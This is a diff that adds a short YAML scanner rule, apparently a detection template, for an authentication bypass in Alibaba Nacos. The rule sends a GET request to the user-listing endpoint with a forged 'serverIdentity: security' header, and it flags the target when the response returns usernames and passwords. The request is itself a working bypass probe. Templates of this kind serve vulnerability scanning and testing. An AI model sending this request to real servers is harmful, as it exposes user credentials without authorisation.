@@ -1,0 +1,10 @@
+name: alibaba-nacos-severidentity-bypass
+rules:
+  - method: GET
+    path: "/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken="
+    headers: 
+        serverIdentity: security
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.headers["content-type"].contains('application/json')
+detail:
+  author: 666
